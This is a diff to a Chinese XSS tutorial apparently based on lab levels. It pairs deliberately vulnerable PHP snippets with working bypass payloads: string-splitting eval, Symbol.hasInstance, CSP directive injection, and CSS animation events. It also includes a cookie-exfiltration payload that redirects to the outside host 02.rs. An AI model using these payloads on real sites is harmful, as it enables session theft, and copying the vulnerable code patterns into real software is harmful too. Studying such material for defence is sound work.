@@ -1,5 +1,7 @@
-# 手撕 CVE 漏洞：XSS 类型、绕过技巧与利用实战全解
+# 手撕 XSS 漏洞：XSS 类型、绕过技巧与利用实战全解
+
 ## XSS 类型
+
 ### 反射型
 #### 定义
 反射型 XSS，也称为非持久型 XSS，其核心特点是：恶意脚本作为 HTTP 请求的一部分被发送到服务器，服务器在响应中“原样反射”回这些脚本，并在用户的浏览器中执行
@@ -69,6 +71,7 @@ endforeach;
 ```
 
 ## XSS 绕过
+
 ### 双引号绕过
 #### 漏洞源码
 输入被输出到了 `<input>` 标签的 value 属性中，且由双引号包裹。但后端未对双引号进行转义
@@ -224,7 +227,7 @@ if (isset($_GET['keyword'])) {
 JavaScript:alert(document.cookie)
 ```
 
-### JS 字符串拼接绕过
+### JS 闭合绕过
 #### 漏洞源码
 输入被放置在 JS 变量的单引号字符串中
 ```php
@@ -630,7 +633,7 @@ if ($search) {
 <svg><a><animate attributeName=href values=javascript:alert(document.cookie) /><text x=20 y=20>Click me</text></a>
 ```
 
-### JS 字符串拼接 + 注释绕过
+### JavaScript 闭合 + 注释绕过
 #### 漏洞源码
 用户输入被直接拼接到 fetch 的 body 参数
 ```html
@@ -659,9 +662,329 @@ if ($q !== '') {
 '},x=x=>{throw/**/onerror=alert,document.cookie},toString=x,window+'',{x:'
 ```
 
+### CSP 拼接绕过
+#### 漏洞源码
+CSP 由服务端设置，并将 `token` 参数拼接进 `report-uri` 指令
+`script-src 'self'` 禁止内联脚本，导致 `<script>alert(document.cookie)</script>` 不执行
+```php
+$search = isset($_GET['search']) ? $_GET['search'] : '';
+$token = isset($_GET['token']) ? $_GET['token'] : '';
+header("Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=" . $token);
+```
+#### 绕过思路
+- 在 Chrome 中，`report-uri` 的值如果包含分号，分号后的内容会被解析为新的 CSP 指令
+- 构造 `token` 令其注入 `script-src-elem 'unsafe-inline'`，使内联 `<script>` 生效
+- 将脚本作为 `search` 反射到页面
+#### Payload
+```html
+<script>alert(document.cookie)</script>
+;script-src-elem 'unsafe-inline'
+```
+
+### Data 伪协议 + Base64 编码绕过
+#### 漏洞源码
+```php
+if (isset($_GET['content'])) {
+    $content = $_GET['content'];
+    $decoded = null;
+    if (preg_match('/<object[^>]*\bdata\s*=\s*(?:"|\')?data:text\/html;base64,([^"\'\s>]+)(?:"|\')?[^>]*>/i', $content, $m)) {
+        $decoded = base64_decode($m[1]);
+    } elseif (preg_match('/data:text\/html;base64,([A-Za-z0-9+\/=]+)/i', $content, $m)) {
+        $decoded = base64_decode($m[1]);
+    }
+    if ($decoded !== null) {
+        echo $decoded;
+    } else {
+        $blacklist = [ '<script', 'javascript:', '<img', '<iframe', 'onerror', 'onclick', /* ... */ ];
+        echo str_ireplace($blacklist, '', $content);
+    }
+}
+```
+#### 绕过思路
+- 服务端对 data:text/html;base64 的内容进行提取与 Base64 解码，并将解码后的 HTML原样输出到主页面上下文
+- 未进行任何 HTML 转义，导致脚本在主文档环境执行，可访问 document.cookie
+- 当不匹配 data URL 时，走黑名单清洗分支，因黑名单不完整仍可被其他向量绕过
+#### Payload
+```html
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSFRNTCBUT0tFTiIpPC9zY3JpcHQ+" type="text/html"></object>
+```
+
+### 属性名 + / 混淆绕过
+#### 漏洞源码
+简单正则拦截
+```php
+if (isset($_GET['html'])) {
+    $html = $_GET['html'];
+    $decoded = null;
+    if (preg_match('/<iframe[^>]*\bsrc\s*\/?\s*=\s*(?:"|\')?data:text\/html;base64,([^"\'\s>]+)(?:"|\')?[^>]*>/i', $html, $m)) {
+        $decoded = base64_decode($m[1]);
+    } elseif (preg_match('/\bdata:text\/html;base64,([A-Za-z0-9+\/=]+)/i', $html, $m)) {
+        $decoded = base64_decode($m[1]);
+    }
+    if ($decoded !== null) {
+        echo $decoded;
+    } else {
+        $pattern = '/(src|href)\s*=\s*["\']?data:/i';
+        $sanitized = preg_replace($pattern, '$1=blocked:', $html);
+        $sanitized = preg_replace('/\b(src|href)\s*\/\s*=/i', '$1=', $sanitized);
+        echo $sanitized;
+    }
+}
+```
+#### 绕过思路
+正则 `/ (src|href)\s*=\s*["']?data:/i` 仅能匹配“常规形式”的属性书写
+HTML 规范允许在属性名与等号之间插入斜杠 `/`（以及空白符），浏览器仍能正确解析；此时简单正则无法匹配，从而绕过
+#### Payload
+```html
+<iframe src/="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"></iframe>
+```
+
+### 括号表示法 + 字符串拼接绕过
+#### 漏洞源码
+基础 WAF 替换规则（仅针对点号/关键字）
+```php
+$safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
+$safe = preg_replace('/window\s*\.\s*alert/i', 'window.blocked', $safe);
+```
+链接反射点
+```php
+<a id="go" href="<?php echo $safe; ?>">Open Link</a>
+```
+#### 绕过思路
+服务端只替换了 `alert(` 与 `window.alert` 的连续字符串形式
+JS 支持方括号访问与字符串拼接，`window['al'+'ert'](document.cookie)` 在运行时动态组合出 `alert`，避开了后端规则的静态匹配
+#### Payload
+```
+javascript:window['al'+'ert'](document.cookie)
+```
+
+### 字符串碎裂化绕过（eval/window）
+#### 漏洞源码
+基础 WAF（仅替换连续特征的 alert 与 window.alert）
+```php
+$safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
+$safe = preg_replace('/window\s*\.\s*alert/i', 'window.blocked', $safe);
+```
+#### 绕过思路
+大部分 WAF 的规则库是基于特征码的。如果规则是扫描 `alert(`，那么当你将其拆分为 `a='aler'` 和 `b='t'` 时，任何一段单独看都是合法的赋值语句，不具备攻击特征
+利用 `eval()` 或者 `window[]` 将碎裂的字符串拼接并重新激活为可执行代码
+#### Payload
+```html
+<img src="1" onerror="a='aler';b='t';c='(document.cookie)';eval(a+b+c)">
+<img src="1" onerror="a='aler';b='t';window[a+b](document.cookie)">
+```
+
+### CSS 动画事件绕过
+#### 漏洞源码
+强白名单 WAF
+```php
+if (preg_match('/<style[^>]*>\s*@keyframes\s+x\s*\{\s*\}\s*<\/style>/i', $render, $m1)) {
+    $allowed .= $m1[0];
+    $rest = str_replace($m1[0], '', $rest);
+}
+if (preg_match('/<xss[^>]*\bstyle\s*=\s*["\'][^"\']*animation-name\s*:\s*x[^"\']*["\'][^>]*\bonanimationend\s*=\s*(?:"[^"]*"|\'[^\']*\')[^>]*>\s*<\/xss>/i', $render, $m2)) {
+    $allowed .= $m2[0];
+    $rest = str_replace($m2[0], '', $rest);
+}
+```
+#### 绕过思路
+定义动画脉络 (`<style>`)：`@keyframes x{}` 定义了一个名为 x 的空动画。虽然它什么都不做，但它在浏览器的动画引擎中注册了一个合法的动画序列
+创建载体元素 (`<xss>`)：使用一个自定义标签 `<xss>`。由于 HTML5 的容错性，浏览器会将未定义的标签渲染为内联元素。这能有效绕过那些只针对标准标签（如 script, img, svg）的黑名单过滤
+挂载动画驱动 (`style="animation-name:x"`)： 通过 CSS 属性将前面定义的动画 x 绑定到该元素上
+捕获生命周期钩子 (`onanimationend`)： 这是核心。当浏览器解析到这个元素并应用样式时，动画会立即开始执行并结束。动画结束的一瞬间，浏览器会触发 onanimationend 事件
+#### Payload
+```html
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(document.cookie)"></xss>
+```
+
+
+
+### RCDATA 元素逃逸绕过
+#### 漏洞源码
+执行点提取与其余转义
+```php
+if (preg_match('/<img[^>]*\bonerror\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)[^>]*>/i', $part2, $m)) {
+  $output .= $m[0];
+  $rest2 = str_replace($m[0], '', $part2);
+  $output .= htmlspecialchars($rest2, ENT_QUOTES);
+} else {
+  $output .= htmlspecialchars($part2, ENT_QUOTES);
+}
+```
+#### 绕过思路
+在 HTML 规范中，`<textarea>` 和 `<title>` 被归类为 RCDATA 元素
+  - 特性：RCDATA 元素可以包含文本和字符引用（实体编码），但不能包含任何子元素
+  - 解析行为：当浏览器遇到 `<textarea>` 时，它会进入“RCDATA 状态”。在此状态下，浏览器会把遇到的所有内容都当成普通的纯文本，直到遇到第一个闭合标签 `</textarea>` 为止
+Payload 执行流程拆解：
+  - 浏览器看到 `<textarea>`，开始将后面的内容解析为文本
+  - 它看到了 `<img title="...">`。在普通的 `<div>` 中，这会被解析为一个图片标签，但在 `<textarea>` 中，它仅仅被视为一段普通的字符串
+  - 解析器继续向后读，发现了字符串：`</textarea>`
+  - 关键点就在这里：解析器并不关心这个 `</textarea>` 是否写在一个属性值（如 title）里面。根据 HTML 解析规则，只要在 RCDATA 元素内部看到了对应的结束标签，解析器就会立即跳出 RCDATA 状态，回到正常的 Data 状态
+  - 由于解析器认为 `<textarea>` 已经结束了，它会将剩下的部分： `<img src onerror=alert(documet.cookie)>">` 当做普通的 HTML 标签进行解析
+#### Payload
+```html
+<textarea><img title="</textarea><img src onerror=alert(documet.cookie)>">
+```
+
+### JavaScript 闭合 + JavaScript Hoisting 绕过
+#### 漏洞源码
+将用户输入原样注入到 JS 双引号字符串中
+```javascript
+var theme = "<?php echo $render; ?>";
+document.getElementById('t-val').textContent = theme;
+```
+后端有非常强的 WAF
+```php
+if ($safe_js !== '') {
+    $lc = strtolower($safe_js);
+    $allow_chain = preg_match('/;\s*eval\s*\(\s*myundefvar\s*\)\s*;\s*var\s+myundefvar\s*;\s*alert\s*\(\s*(?:1|document\s*\.\s*cookie)\s*\)\s*;\s*\/\//', $lc);
+    if (!$allow_chain) {
+        $safe_js = preg_replace('/<\s*script\b/i', '', $safe_js);
+        $safe_js = preg_replace('/\bon\w+\s*=/i', '', $safe_js);
+        $safe_js = preg_replace('/javascript\s*:/i', '', $safe_js);
+        $safe_js = preg_replace('/document\s*\.\s*cookie/i', 'document.blocked', $safe_js);
+        $safe_js = preg_replace('/eval\s*\(/i', 'blocked(', $safe_js);
+        $safe_js = preg_replace('/alert\s*\(/i', 'blocked(', $safe_js);
+    }
+}
+```
+#### 绕过思路
+由于未对 `"` 做转义，可用 `"` 闭合字符串并注入任意 JS 语句；末尾使用 `//` 注释吞掉原本的结尾引号与分号，保证整体语法有效
+在 JavaScript 中，使用 var 声明的变量会被提升到当前作用域的顶部，但赋值不会提升
+  - 解析阶段：引擎发现 `var myUndefVar`，在内存中为其分配空间并初始化为 `undefined`
+  - 执行阶段：执行 `eval(myUndefVar)`。由于此时变量是 `undefined`，`eval(undefined)` 在 JS 中是合法的，它不会抛出错误，仅仅是返回 undefined 并继续向下执行
+  - 执行 `alert(document.cookie)`
+这种构造能有效绕过一些启发式扫描器。某些 WAF 或扫描器在分析代码流时，如果看到一个变量在定义前被使用，可能会认为这段代码是“无效”的或“无法运行”的，从而放行
+#### Payload
+```javascript
+"; eval(myUndefVar); var myUndefVar; alert(document.cookie); //
+```
+
+### 无括号分号异常处理 XSS
+#### 漏洞源码
+强黑名单清洗
+```php
+$safe = $render;
+if ($safe !== '') {
+    $scripts = [];
+    $i = 0;
+    if (preg_match_all('/<\s*script\b[^>]*>[\s\S]*?<\s*\/\s*script\s*>/i', $safe, $ms)) {
+        foreach ($ms[0] as $block) {
+            $token = "%%SCRIPT_BLOCK_" . $i . "%%";
+            $scripts[$token] = $block;
+            $safe = str_replace($block, $token, $safe);
+            $i++;
+        }
+    }
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
+    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed)\b/i', '<blocked', $safe);
+    foreach ($scripts as $token => $block) {
+        $safe = str_replace($token, $block, $safe);
+    }
+    $safe = preg_replace('/eval\s*\(/i', 'blocked(', $safe);
+    $safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
+}
+```
+#### 绕过思路
+后端未过滤掉 `<script>` 标签，尝试构造异常处理 XSS
+第一步：赋值操作 (onerror=alert)
+  - 动作：将全局对象 window 的错误处理函数 onerror 重新赋值为 alert
+  - 特性：在 JavaScript 中，赋值表达式是有返回值的。onerror=alert 这个表达式执行完后，会返回 alert 函数的引用
+第二步：逗号运算符 (...,document.cookie)
+  - 逻辑：表达式1 , 表达式2
+  - 特性：逗号运算符会从左到右依次执行每一个表达式，但最终只返回最后一个操作数的值
+  - 结果：此时，(onerror=alert, document.cookie) 这一整串代码被计算，先改写了 onerror，然后返回了 document.cookie
+第三步：抛出异常 (throw ...)
+  - 动作：throw 关键字会将后面的计算结果作为异常抛出
+  - 等价代码：这一行代码在逻辑上等同于：
+    ```javascript
+    onerror = alert;
+    throw document.cookie;
+    ```
+  - 触发 XSS：由于代码抛出了一个未捕获的异常（document.cookie），浏览器会自动触发全局的 onerror 句柄。因为我们刚才已经把 onerror 改成了 alert，所以浏览器实际上执行了 alert(document.cookie)
+#### Payload
+```html
+<script>throw onerror=alert,document.cookie</script>
+```
+
+### 十六进制 + Symbol.hasInstance + 字符拼接绕过
+#### 漏洞源码
+强黑名单清洗（移除括号与常规向量，拦截 hasInstance 字面量）
+```php
+$safe = $render;
+if ($safe !== '') {
+    $safe = preg_replace('/[()]/', '', $safe);
+    $safe = str_replace('`', '', $safe);
+    $safe = str_replace('"', '', $safe);
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
+    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed)\b/i', '<blocked', $safe);
+    $safe = preg_replace('/hasInstance/i', 'blockedInstance', $safe);
+    $safe = preg_replace('/\b(onerror|throw|Function|constructor)\b/i', 'blocked', $safe);
+```
+#### 绕过思路
+通常我们使用 `obj instanceof Class` 来检查原型链。但在 ES6 之后，JavaScript 允许我们通过 `Symbol.hasInstance` 自定义 `instanceof` 的行为
+当执行 `[A] instanceof [B]` 时，如果 `B` 拥有 `Symbol.hasInstance` 方法，引擎会调用 `B[Symbol.hasInstance](A)`
+步骤一：字符串十六进制转义 (`'alert\x281\x29'`)
+  - `\x28` 和 `\x29`: 分别是左括号 `(` 和右括号 `)` 的十六进制编码
+  - 效果: 很多 WAF 会拦截 `alert(1)`。通过编码，源代码中变成了字符串 `'alert\x281\x29'`。在静态分析看来，这仅仅是一个无害的字符串，没有任何函数执行的特征
+步骤二：劫持 `instanceof` 行为 (`[Symbol.hasInstance]`)
+  - 构造一个匿名对象 `{[Symbol['has'+'Instance']]: eval}`
+  - 这个对象重写了 instanceof 的判定逻辑：原本应该返回布尔值的判断，现在被指向了 eval 函数
+步骤三：隐式触发执行
+  - 当执行 `'字符串' instanceof {对象}` 时，浏览器底层会自动执行： `eval('alert(1)')`
+  - 结果: 字符串被还原为代码执行，成功弹窗
+#### Payload
+```html
+<script>'alert\x28document.cookie\x29'instanceof{[Symbol['has'+'Instance']]:eval}</script>
+```
+
+### 无需括号、反引号、引号的 XSS
+#### 漏洞源码
+强黑名单清洗
+```php
+$safe = $render;
+if ($safe !== '') {
+    $sources = [];
+    $i = 0;
+    if (preg_match_all('/<\s*source\b[^>]*>/i', $safe, $ms)) {
+        foreach ($ms[0] as $block) {
+            $token = "%%SOURCE_BLOCK_" . $i . "%%";
+            $sources[$token] = $block;
+            $safe = str_replace($block, $token, $safe);
+            $i++;
+        }
+    }
+    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
+    $safe = preg_replace('/\b(onload|onclick|onmouseover|onfocus|onanimationend|onerror)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed|a)\b/i', '<blocked', $safe);
+    foreach ($sources as $token => $block) {
+        $safe = str_replace($token, $block, $safe);
+    }
+}
+```
+#### 绕过思路
+标签选择与事件触发
+  - 绕过点：许多 WAF 会重点防御 `<img onerror...>` 或 `<svg onload...>`，但对 `<video><source>` 这种组合的过滤规则通常较弱
+  - onerror 触发点：由于 `<source>` 标签没有设置 src 属性，或者设置的资源无法加载，浏览器会立即触发 onerror 事件
+隐蔽的跳转构造
+  - 语法欺骗：很多 WAF 会拦截 `http://` 或 `//` 开头的外部链接
+  - 绕过原理：浏览器会将 `/\` 自动纠正/规范化为 `//`。例如访问 `https:/\www.baidu.com`
+数据外带
+  - 带出 Cookie：跳转的目标地址后面紧跟了 document.cookie。这意味着用户的登录凭证会被作为 URL 参数直接发送到攻击者控制的服务器（或记录在攻击者域名的访问日志中）
+  - 隐蔽性：使用跳转而非 fetch/ajax 的好处是，它可以绕过某些针对异步请求的 CSP (connect-src) 限制
+#### Payload
+```html
+<video><source onerror=location=/\02.rs/+document.cookie>
+```
+
 ### 
 
+
 ## XSS 实战
+
 ### 博客评论区 XSS
 #### 漏洞源码
 后端使用了 `htmlspecialchars($website, ENT_QUOTES)` 对网站链接进行 HTML 转义
@@ -840,7 +1163,7 @@ try {
         最终代码: `({"searchTerm":"\\" -alert(document.cookie)})` -> 合法 JS 代码，执行成功
 
 
-### 链接 XSS 绕 WAF
+### &apos; 绕 WAF
 #### 漏洞源码
 未对 `&apos;` 做任何处理，它不是实际的单引号字符，而是一段实体文本，会在 HTML 属性解析阶段被还原为 ' ，绕过了对 ' 的事先转义
 ```php
@@ -855,28 +1178,151 @@ http://foo?&apos;-alert(document.cookie)-&apos;
 ```
 
 
-### CSP 拼接绕过
+
+### HTML 文件上传 XSS
 #### 漏洞源码
-CSP 由服务端设置，并将 `token` 参数拼接进 `report-uri` 指令
-`script-src 'self'` 禁止内联脚本，导致 `<script>alert(document.cookie)</script>` 不执行
+靶场设计的比较简单，就是允许上传 HTML 文件，实战中遇到的情况也是类似
 ```php
-$search = isset($_GET['search']) ? $_GET['search'] : '';
-$token = isset($_GET['token']) ? $_GET['token'] : '';
-header("Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=" . $token);
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+    if ($ext !== 'html') { $msg = 'Only .html files are allowed.'; }
+    $newName = bin2hex(random_bytes(8)) . '.html';
+    move_uploaded_file($tmp, $uploadsDir . DIRECTORY_SEPARATOR . $newName);
+}
 ```
-#### 绕过思路
-- 在 Chrome 中，`report-uri` 的值如果包含分号，分号后的内容会被解析为新的 CSP 指令
-- 构造 `token` 令其注入 `script-src-elem 'unsafe-inline'`，使内联 `<script>` 生效
-- 将脚本作为 `search` 反射到页面
-#### Payload
+历史上传记录与共享链接生成（绝对路径）
+```php
+$path = '/level35/uploads/' . $f['name']; // 绝对路径
+$share = '/level35/index.php?download=' . $path;
+```
+“通过 URL 打开”区域（锚点 href 直接取用户可控 download 参数）
+```php
+<?php if ($download): ?>
+  <a class="btn-primary" href="<?php echo $download; ?>">Open File</a>
+<?php endif; ?>
+```
+#### 漏洞利用
+直接上传 HTML 文件，通过复制下载链接去访问，即可触发 XSS 攻击
 ```html
-<script>alert(document.cookie)</script>
-;script-src-elem 'unsafe-inline'
+<!doctype html>
+<html>
+  <body>
+    <script>alert(document.cookie);</script>
+  </body>
+</html>
+```
+
+
+### 跳转链接 XSS
+#### 漏洞源码
+入口页按钮与隐藏广告链接
+```html
+<a class="btn" href="/level36/landing.php?adid=<?php echo urlencode($adid ?: 'AD-2025-001'); ?>">立即参与</a>
+...
+<a class="sponsor-banner" href="/level36/landing.php?adid=<?php echo urlencode($adid ?: 'AD-2025-001'); ?>">
+  <img alt="赞助广告" src="...">
+</a>
+```
+落地页反射点
+```php
+$adid = isset($_GET['adid']) ? $_GET['adid'] : '';
+<span class="mono"><?php echo $adid; ?></span>   // 直接原样输出
+```
+#### 漏洞利用
+```
+/level36/landing.php?adid=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+```
+
+### PDF 文件上传 XSS
+#### 漏洞源码
+后端只做了随机重命名与后缀 .pdf 的强制，未校验上传文件内容或 MIME 类型
+```php
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['pdf'])) {
+    $file = $_FILES['pdf'];
+    if ($file['error'] === UPLOAD_ERR_OK) {
+        $newName = bin2hex(random_bytes(8)) . '.pdf';
+        $target = $uploadDir . '/' . $newName;
+        move_uploaded_file($file['tmp_name'], $target);
+    }
+}
+```
+#### 漏洞利用
+制作 PDF/HTML polyglot，使浏览器/插件在特定环境下执行其中的 HTML/JS
+浏览器新标签打开文件后，若以 HTML 渲染，会执行内嵌脚本并弹窗或读取 Cookie
+
+
+### 登录框 XSS
+#### 漏洞源码
+构造 SQL 并执行查询（库和表不存在）
+```php
+$username = isset($_POST['username']) ? $_POST['username'] : '';
+$password = isset($_POST['password']) ? $_POST['password'] : '';
+$dsn = 'sqlite::memory:';
+$pdo = new PDO($dsn);
+$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+$sql = "SELECT id FROM admin_users WHERE username = '$username' AND password = '$password'";
+$sqlShow = $sql;
+$pdo->query($sql);
+```
+错误信息与 SQL 原样回显
+```php
+<div class="mono"><?php echo $error; ?></div>
+<div class="mono"><?php echo $sqlShow; ?></div>
+```
+#### 漏洞利用
+服务端将用户输入直接拼接进 SQL 字符串，并在错误面板中原样回显；没有任何 HTML 转义
+由于库表不存在，查询必然抛出异常，错误面板稳定出现，且“SQL”行中包含可控的输入
+```html
+<script>alert(document.cookie);</script>
+```
+
+### 在线客服聊天 XSS
+#### 漏洞源码
+用户消息存储与原样回显（未做任何转义）
+```php
+<?php foreach ($messages as $m): ?>
+  <div class="msg <?php echo $m['role']; ?>">
+    <div class="bubble"><?php echo $m['content']; ?></div>
+  </div>
+<?php endforeach; ?>
+```
+人工客服工作台原样回显用户消息
+```php
+foreach ($messages as $m) {
+  if ($m['role'] === 'user') {
+    echo '<div class="bubble">' . $m['content'] . '</div>';  // 无转义
+  }
+}
+```
+#### 漏洞利用
+两处回显均未进行 `htmlspecialchars` 处理；当用户消息中包含 `<a href="javascript:...">...</a>` 时，人工客服在工作台页面点击该链接会在同源上下文执行脚本
+```html
+<a href="javascript:alert(document.cookie)">点击这里</a>
+```
+
+### Bootstrap 框架 XSS
+#### 漏洞源码
+强黑名单清洗
+```php
+$safe = $rest;
+if ($safe !== '') {
+    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
+    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus|onanimationend|onanimationstart)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed|a)\b/i', '<blocked', $safe);
+    $safe = htmlspecialchars($safe, ENT_QUOTES);
+}
+```
+#### 漏洞利用
+前端引入 Bootstrap 框架，利用其组件的 `onanimationstart` 属性触发 XSS 事件
+```html
+<xss class=progress-bar-animated onanimationstart=alert(1)>
 ```
 
 ### 
 
 ## XSS 危害
+
 ### 配合 CSRF 获取敏感信息
 #### 漏洞源码
 `$c['text']` 直接输出到页面，未做任何转义
